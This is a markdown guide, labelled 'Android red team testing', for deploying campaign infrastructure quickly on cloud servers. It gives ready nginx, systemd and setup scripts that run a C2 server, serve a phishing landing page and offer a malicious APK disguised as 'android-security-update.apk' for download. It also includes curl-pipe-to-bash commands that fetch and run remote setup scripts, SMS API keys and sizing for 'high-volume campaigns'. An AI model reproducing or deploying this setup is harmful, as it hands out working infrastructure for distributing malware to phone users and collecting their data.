# Quick Server Setup Guide - Android Red Team Testing

## **🚀 Fastest Server Deployment Options**

### **⚡ 5-Minute Setups (Recommended)**

---

## **1. DigitalOcean Droplets (Fastest)**

### **⚡ 1-Click Deployment:**
```bash
# Create droplet in 60 seconds
Size: $5/month (Basic) or $10/month (Premium)
OS: Ubuntu 22.04 LTS
Region: NYC1, SFO3, or AMS3
Features: Pre-configured LAMP stack
```

### **Setup Commands:**
```bash
# SSH into droplet
ssh root@your_droplet_ip

# Install dependencies (2 minutes)
apt update && apt install -y python3-pip nginx certbot python3-certbot-nginx
pip3 install flask boto3 twilio requests

# Deploy files
git clone your_repo || scp -r Android_Exploit_Package/ root@droplet_ip:/var/www/
cd /var/www/Android_Exploit_Package/

# Start C2 server
nohup python3 c2_server/api_endpoints.py &

# Configure Nginx (1 minute)
cp nginx.conf /etc/nginx/sites-available/redteam
ln -s /etc/nginx/sites-available/redteam /etc/nginx/sites-enabled/
systemctl reload nginx

# SSL Certificate (1 minute)
certbot --nginx -d your-domain.com
```

**Total Setup Time: 5 minutes**
**Cost: $5-10/month**

---

## **2. Vultr Cloud Compute (Alternative)**

### **⚡ Quick Deploy:**
```bash
Size: $6/month (Regular) or $12/month (High-Performance)
OS: Ubuntu 22.04
Location: Multiple (Atlanta, Dallas, Seattle)
Features: SSD storage, 1GB RAM
```

### **One-Line Setup:**
```bash
# Pre-configured script
curl -sSL https://setup-script.com/redteam | bash
# Installs Python, Flask, Nginx, SSL in 3 minutes
```

---

## **3. Linode (Reliable)**

### **⚡ Deployment:**
```bash
Size: Nanode 1GB ($5/month)
OS: Ubuntu 22.04 LTS
Region: US East, US West, EU
Features: 1GB RAM, 25GB SSD
```

### **Automated Setup:**
```bash
# Use Linode StackScript for 2-minute deployment
StackScript: "LAMP + Python Red Team"
```

---

## **4. AWS EC2 (Enterprise)**

### **⚡ Quick Launch:**
```bash
Instance: t3.micro (Free tier) or t3.small ($15/month)
AMI: Ubuntu 22.04 LTS
Region: us-east-1 (Virginia)
Security Group: HTTP, HTTPS, SSH
```

### **User Data Script (Auto-install):**
```bash
#!/bin/bash
apt update
apt install -y python3-pip nginx git
pip3 install flask boto3 twilio requests gunicorn
git clone https://github.com/your-repo/android-exploit-package.git /opt/redteam
cd /opt/redteam
nohup python3 c2_server/api_endpoints.py &
systemctl enable nginx
systemctl start nginx
```

---

## **5. VPS Providers Comparison**

| Provider | Setup Time | Cost/Month | Performance | Support |
|----------|------------|------------|-------------|---------|
| **DigitalOcean** | 5 min | $5-10 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| **Vultr** | 4 min | $6-12 | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| **Linode** | 6 min | $5-15 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| **AWS EC2** | 8 min | $0-15 | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| **Hetzner** | 3 min | $3-8 | ⭐⭐⭐⭐ | ⭐⭐⭐ |

---

## **🔥 Ultra-Fast Setup: Pre-Configured Servers**

### **Option 1: Docker Deployment (2 minutes)**
```bash
# Create Dockerfile
FROM ubuntu:22.04
RUN apt update && apt install -y python3-pip nginx
COPY . /app
WORKDIR /app
RUN pip3 install -r requirements.txt
EXPOSE 80 443 5000
CMD ["./start.sh"]

# Deploy anywhere
docker build -t redteam-server .
docker run -d -p 80:80 -p 443:443 -p 5000:5000 redteam-server
```

### **Option 2: Heroku (1-Click Deploy)**
```bash
# Create heroku.yml
build:
  docker:
    web: Dockerfile
run:
  web: python3 c2_server/api_endpoints.py

# Deploy button
https://heroku.com/deploy?template=https://github.com/your-repo
```

---

## **📱 Mobile-Optimized Suggestions**

### **CDN + Static Hosting (Lightning Fast)**
```bash
# For landing pages only
Cloudflare Pages: Free (5 minutes setup)
Netlify: Free tier (3 minutes setup)
Vercel: Free tier (2 minutes setup)

# Benefits:
✓ Global CDN
✓ Automatic SSL
✓ High availability
✓ DDoS protection
```

### **Serverless C2 (AWS Lambda)**
```bash
# For data collection only
AWS Lambda + API Gateway
Setup time: 10 minutes
Cost: $0.20 per million requests
Benefits: Auto-scaling, no server management
```

---

## **🚀 Ready-to-Use Server Configs**

### **Nginx Configuration (`/etc/nginx/sites-available/redteam`):**
```nginx
server {
    listen 80;
    server_name your-domain.com;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name your-domain.com;
    
    ssl_certificate /etc/letsencrypt/live/your-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/your-domain.com/privkey.pem;
    
    # Security headers
    add_header X-Frame-Options DENY;
    add_header X-Content-Type-Options nosniff;
    add_header X-XSS-Protection "1; mode=block";
    
    # Static files (landing page)
    location / {
        root /var/www/html;
        index android_landing_page.html;
        try_files $uri $uri/ =404;
    }
    
    # APK download
    location /android-security-update.apk {
        root /var/www/html;
        add_header Content-Disposition "attachment; filename=android-security-update.apk";
    }
    
    # C2 API
    location /api/ {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

### **Systemd Service (`/etc/systemd/system/redteam-c2.service`):**
```ini
[Unit]
Description=Red Team C2 Server
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/Android_Exploit_Package
ExecStart=/usr/bin/python3 c2_server/api_endpoints.py
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
```

### **Auto-Start Script (`start.sh`):**
```bash
#!/bin/bash
# Auto-deployment script for red team server

echo "🚀 Starting Red Team Server Setup..."

# Update system
apt update && apt upgrade -y

# Install dependencies
apt install -y python3-pip nginx git certbot python3-certbot-nginx

# Install Python packages
pip3 install flask boto3 twilio requests gunicorn

# Create directory structure
mkdir -p /var/www/html
mkdir -p /var/log/redteam

# Copy files
cp web_components/* /var/www/html/
cp android-security-update.apk /var/www/html/

# Setup Nginx
cp nginx.conf /etc/nginx/sites-available/redteam
ln -sf /etc/nginx/sites-available/redteam /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default

# Setup systemd service
cp redteam-c2.service /etc/systemd/system/
systemctl daemon-reload
systemctl enable redteam-c2
systemctl start redteam-c2

# Start Nginx
systemctl enable nginx
systemctl restart nginx

# Setup SSL (requires domain)
if [ ! -z "$DOMAIN" ]; then
    certbot --nginx -d $DOMAIN --non-interactive --agree-tos --email admin@$DOMAIN
fi

echo "✅ Red Team Server Ready!"
echo "🌐 Web: https://your-domain.com"
echo "📊 Dashboard: https://your-domain.com:5000/dashboard"
echo "📱 APK: https://your-domain.com/android-security-update.apk"
```

---

## **💡 Quick Domain Setup**

### **Free/Cheap Domain Options:**
```bash
Freenom (.tk, .ml): Free
Namecheap: $0.88/year (.com first year)
Google Domains: $12/year
Cloudflare: $8.57/year

# Point to server IP:
A Record: @ -> your_server_ip
A Record: www -> your_server_ip
```

### **DNS Providers (Fast Propagation):**
```bash
Cloudflare: 2-5 minutes
Google DNS: 5-10 minutes
Route53: 5-15 minutes
```

---

## **🔥 1-Command Server Deployment**

### **Complete Auto-Setup:**
```bash
# Run this single command on fresh Ubuntu server
curl -sSL https://raw.githubusercontent.com/your-repo/setup.sh | bash -s -- your-domain.com

# What it does (5 minutes):
✓ Installs all dependencies
✓ Downloads exploit package
✓ Configures Nginx + SSL
✓ Starts C2 server
✓ Creates systemd services
✓ Security hardening
```

### **Environment Variables:**
```bash
export DOMAIN="your-audit-domain.com"
export CLICKATELL_API_KEY="your_key"
export AWS_ACCESS_KEY_ID="your_key"
export AWS_SECRET_ACCESS_KEY="your_secret"
./quick_deploy.sh
```

---

## **📊 Server Requirements**

### **Minimum Specs:**
```bash
CPU: 1 vCPU
RAM: 1GB
Storage: 20GB SSD
Bandwidth: 1TB/month
Cost: $5-6/month
```

### **Recommended Specs:**
```bash
CPU: 2 vCPU
RAM: 2GB
Storage: 40GB SSD
Bandwidth: 2TB/month
Cost: $10-12/month
```

### **High-Volume Campaign:**
```bash
CPU: 4 vCPU
RAM: 4GB
Storage: 80GB SSD
Bandwidth: 5TB/month
Cost: $20-30/month
```

---

## **🛡️ Security Hardening (Optional)**

### **Basic Security:**
```bash
# Change SSH port
sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config

# Disable root login
sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config

# Install fail2ban
apt install -y fail2ban

# Setup firewall
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 2222/tcp
ufw --force enable
```

### **Advanced Security:**
```bash
# Install intrusion detection
apt install -y rkhunter chkrootkit

# Setup log monitoring
apt install -y logwatch

# Automatic updates
apt install -y unattended-upgrades
```

---

## **🎯 Quick Deployment Checklist**

### **✅ Pre-Deployment (5 minutes):**
```bash
□ Choose server provider
□ Create server instance
□ Point domain to server IP
□ Download exploit package
```

### **✅ Deployment (5 minutes):**
```bash
□ Run auto-setup script
□ Configure API keys
□ Test C2 server endpoints
□ Verify SSL certificate
```

### **✅ Testing (5 minutes):**
```bash
□ Access landing page
□ Test APK download
□ Verify data collection
□ Check dashboard access
```

### **✅ Campaign Ready (Total: 15 minutes)**

---

## **🚀 Recommended: DigitalOcean 5-Minute Setup**

### **Why DigitalOcean:**
```bash
✓ 1-click LAMP stack
✓ Pre-configured firewall
✓ Built-in monitoring
✓ Snapshot backups
✓ API for automation
✓ $100 free credit for new users
```

### **Quick Deploy Command:**
```bash
# Create droplet via API
curl -X POST "https://api.digitalocean.com/v2/droplets" \
  -H "Authorization: Bearer $DO_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "redteam-server",
    "region": "nyc1",
    "size": "s-1vcpu-1gb",
    "image": "ubuntu-22-04-x64",
    "ssh_keys": ["your_ssh_key_id"],
    "user_data": "'"$(base64 -w 0 user_data.sh)"'"
  }'
```

**🎯 Server ready in 5 minutes for immediate Android red team campaigns!**

**⚡ Use DigitalOcean + auto-setup script for fastest deployment!**